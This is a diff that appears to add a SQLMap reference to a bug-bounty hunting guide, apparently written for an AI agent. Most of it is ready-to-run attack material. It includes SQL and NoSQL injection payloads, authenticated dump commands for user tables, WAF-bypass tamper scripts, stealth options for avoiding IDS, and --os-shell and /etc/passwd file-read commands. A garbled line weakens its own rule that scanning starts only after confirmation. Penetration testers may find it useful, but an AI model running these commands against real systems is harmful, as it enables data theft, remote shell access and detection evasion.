@@ -512,3 +512,168 @@ The following real, verified bug-bounty / CVE / coordinated-disclosure cases ext
 - **`hunt-auth-bypass`** — Classic `' OR 1=1 --` in login forms or session tables is auth-bypass-via-SQLi. Chain primitive: SQLi on the `password_reset_tokens` table → read or insert a token row for `admin@target.com` → ATO without ever seeing the original password.
 - **`security-arsenal`** — Reach for the SQLi payload tree (WAF-bypass union variants `/**/UnIoN/**/SeLeCt/**/`, MSSQL `WAITFOR DELAY '0:0:10'`, MySQL `SLEEP(10)`, Postgres `pg_sleep(10)`, Oracle `DBMS_PIPE.RECEIVE_MESSAGE`, NoSQLi `{"$ne": null}` / `{"$where": "sleep(5000)"}`, second-order via stored-then-rendered fields).
 - **`triage-validation`** — Apply the Reproducibility Gate before reporting. A 200ms delta on a sleep-10 payload is noise, not blind SQLi. Require statistical evidence (5 trials at 0s vs 5 trials at 10s, non-overlapping confidence intervals) or an OOB DNS callback with a unique marker. The hunt-sqli internal sentinel/baseline pattern exists for exactly this.
+
+---
+
+# SQLMap Reference — Post-Confirmation Automation
+
+Unless the user asks, else, Only run SQLMap **after** manually confirming injection. Running blind wastes time, generates noise, and risks burning the engagement via IDS alerts.
+
+---
+
+## Authentication
+
+```bash
+# Bearer JWT
+sqlmap -u "URL" -H "Authorization: Bearer TOKEN" --dbs --batch
+
+# Cookie session
+sqlmap -u "URL" --cookie="session=TOKEN" --dbs --batch
+
+# Basic auth
+sqlmap -u "URL" --auth-type=basic --auth-cred="user:pass" --dbs --batch
+```
+
+---
+
+## Request Targeting
+
+```bash
+# Specific parameter only (don't test all params)
+sqlmap -u "https://target.com/api?type=BUY&page=1" -p type --dbs --batch
+
+# POST JSON body
+sqlmap -u "URL" --data='{"search":"test","page":1}' \
+  --content-type="application/json" -p search --dbs --batch
+
+# From saved Burp request file (most reliable)
+sqlmap -r request.txt --dbs --batch
+```
+
+---
+
+## DB Engine Targeting
+
+```bash
+sqlmap -u "URL" -p param --dbms=mssql --dbs --batch
+sqlmap -u "URL" -p param --dbms=mysql --dbs --batch
+sqlmap -u "URL" -p param --dbms=postgresql --dbs --batch
+```
+
+---
+
+## Technique Selection
+
+```
+B=Boolean  E=Error  U=Union  S=Stacked  T=Time  Q=Inline
+```
+
+```bash
+sqlmap -u "URL" -p param --technique=B --batch       # boolean only
+sqlmap -u "URL" -p param --technique=T --batch       # time-based only
+sqlmap -u "URL" -p param --technique=BET --batch     # boolean+error+time
+sqlmap -u "URL" -p param --technique=BEUST --batch   # all techniques
+```
+
+**Which technique to use:**
+
+| Oracle type | What you observed | Use |
+|-------------|------------------|-----|
+| Verbose SQL error in response | Error message with DB version/table | `--technique=E` |
+| Boolean diff (true≠false body) | Different content, same status | `--technique=B` |
+| Volume-based (OR true → 500/"too large") | Status code changes | `--technique=B --code=200` |
+| IIF divide-by-zero (200=true, 500=false) | Status code changes | `--technique=E` |
+| No visible diff, only timing | Response time jumps 5s | `--technique=T` |
+| Stacked queries work (`;SELECT`) | Second query executes | `--technique=S` |
+
+---
+
+## Enumeration
+
+```bash
+sqlmap -u "URL" -p param --dbs --batch                               # list databases
+sqlmap -u "URL" -p param -D dbname --tables --batch                  # list tables
+sqlmap -u "URL" -p param -D dbname -T tablename --columns --batch    # list columns
+sqlmap -u "URL" -p param -D dbname -T users --dump --batch           # dump full table
+
+# Dump specific columns only (avoid dumping PII you don't need)
+sqlmap -u "URL" -p param -D dbname -T users -C "username,email" --dump --batch
+```
+
+---
+
+## Volume-Based Oracle
+
+When OR true causes 500 or "message too large":
+
+```bash
+# Use response string as true signal
+sqlmap -u "URL" -p param --string="normal response text" --technique=B --batch
+
+# Use HTTP status code as oracle
+sqlmap -u "URL" -p param --code=200 --technique=B --batch
+```
+
+---
+
+## WAF Bypass Tamper Scripts
+
+```bash
+sqlmap -u "URL" -p param --tamper=randomcase --dbs --batch
+sqlmap -u "URL" -p param --tamper=space2comment --dbs --batch
+sqlmap -u "URL" -p param --tamper=randomcase,space2comment,between --dbs --batch
+```
+
+| Tamper script | What it does |
+|--------------|-------------|
+| `between` | Replaces `>` with `BETWEEN x AND y` |
+| `randomcase` | Random case on keywords (`SeLeCt`) |
+| `space2comment` | Spaces to `/**/` |
+| `charencode` | URL encode payload chars |
+| `chardoubleencode` | Double URL encode |
+| `equaltolike` | `=` to `LIKE` |
+| `greatest` | `>` to `GREATEST()` |
+| `space2dash` | Spaces to `--\n` |
+| `space2mssqlblank` | Spaces to MSSQL blank chars |
+
+---
+
+## Stealth / Rate Limiting
+
+```bash
+# Fixed delay between requests
+sqlmap -u "URL" -p param --delay=2 --random-agent --dbs --batch
+
+# Safe URL to mix in normal requests
+sqlmap -u "URL" -p param --safe-url="https://target.com/" --safe-freq=3 --dbs --batch
+```
+
+---
+
+## Aggression Tuning
+
+```bash
+# level 1-5: how many params/headers to test (default 1)
+# risk  1-3: how dangerous the payloads are (default 1)
+sqlmap -u "URL" --level=3 --risk=2 --batch    # balanced — default choice
+sqlmap -u "URL" --level=5 --risk=3 --batch    # aggressive — use carefully
+```
+
+---
+
+## Output & Verbosity
+
+```bash
+sqlmap -u "URL" -p param --dbs --batch --output-dir=/tmp/sqlmap_out
+sqlmap -u "URL" -p param --dbs --batch -v 3   # show payloads being sent
+```
+
+---
+
+## Privilege Escalation (MSSQL Sysadmin Only)
+
+```bash
+sqlmap -u "URL" -p param --privileges --batch              # check DB user privs
+sqlmap -u "URL" -p param --os-shell --batch                # interactive OS shell via xp_cmdshell
+sqlmap -u "URL" -p param --file-read="/etc/passwd" --batch # read server file
+```
